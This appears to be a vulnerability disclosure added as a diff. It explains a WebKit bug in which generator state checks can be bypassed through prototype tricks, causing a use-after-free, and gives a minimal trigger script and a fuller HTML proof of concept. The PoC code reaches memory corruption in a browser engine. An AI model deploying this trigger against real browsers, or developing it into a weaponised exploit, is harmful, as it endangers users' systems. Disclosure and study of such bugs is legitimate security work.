@@ -1,0 +1,138 @@
+<!--
+In WebKit, resuming a generator is implemented in JavaScript. An internal object property, @generatorState is used to prevent recursion within generators. In GeneratorPrototype.js, the state is checked by calling:
+
+    var state = this.@generatorState;
+
+and set by calling:
+
+    generator.@generatorState = @GeneratorStateExecuting;
+
+
+Checking that the @generator property is set is also used in place of type checking the generator.
+
+Therefore, if Generator.next is called on an object with a prototype that is a Generator, it will pass the type check, and the internal properties of the Generator prototype will be used to resume the generator. However, when @generatorState, it will be set as an own property on the object, not the prototype. This allows the creation of non-Generator objects with the @generatorState set to completed.
+
+It is then possible to bypass the recursion check by setting the prototype of one of these objects to a Generator, as the check will then get the object's @generatorState own property, meanwhile the other internal properties will come from the prototype.
+
+Generators are not intended to allow recursion, so a reference to the scope is not maintained, leading to a use-after free.
+
+A minimal sample of the script causing this problem is below, and a full PoC is attached.
+
+var iterator;
+
+var a = [];
+
+function* foo(index) {
+
+  while (1) {
+    var q = a.pop();
+    if(q){
+    	q.__proto__ = iterator;
+  	  q.next();
+    }
+    yield index++;
+  }
+}
+
+function* foo2(){
+    yield;
+}
+
+var temp = foo2(0);
+
+for(var i = 0; i < 10; i++){ // make a few objects with @generatorState set
+	var q = {};
+	q.__proto__ = temp;
+	q.next();
+	q.__proto__ = {};
+	a.push(q);
+
+}
+
+iterator = foo(0);
+
+var q = {};
+q.__proto__ = iterator;
+print(q.next().value);
+-->
+
+<html><body><script>
+print = console.log;
+print("top");
+var iterator;
+var o = function(){print("hello")};
+var a = [];
+function* foo(index) {
+  //print("start");
+
+  while (1) {
+    //if(index == 77){
+      //  o = 0;
+       // gc();        
+//	index = 2;
+  //      var a = [1, 2, 3, 4];
+	//yield 9;
+        //print("a vale " + a[0]);
+    //}
+    //if(index == 1){
+    //index = 77;
+   // print("INTERNAL CALL")
+   // iterator.next();
+    //index++;
+
+    //}
+    //var b = [1, 2, 3, 4];
+    var q = a.pop();
+    if(q){
+    print("here1");
+    q.__proto__ = iterator;
+    q.next();
+    }
+    yield index++;
+    //print("bval" + b[0]);
+  }
+}
+
+function* foo2(){
+
+    yield;
+
+}
+
+var temp = foo2(0);
+
+for(var i = 0; i < 10; i++){
+
+	var q = {};
+	q.__proto__ = temp;
+	q.next();
+	q.__proto__ = {};
+	a.push(q);
+
+}
+//print(a);
+iterator = foo(0);
+
+
+// expected output: 0
+
+
+
+
+o.__proto__ = iterator;
+//print("FIRST CALL")
+//print(o.next().value);
+//print("SECOND CALL")
+//print(o.next().value);
+//print("THIRD CALL")
+
+for(var i = 0; i < 10; i++){
+var q = {};
+q.__proto__ = iterator;
+print(q.next("hello").value);
+}
+
+//print("FOURTH CALL")
+//print(iterator.next().value);
+o();
+</script></body></html>
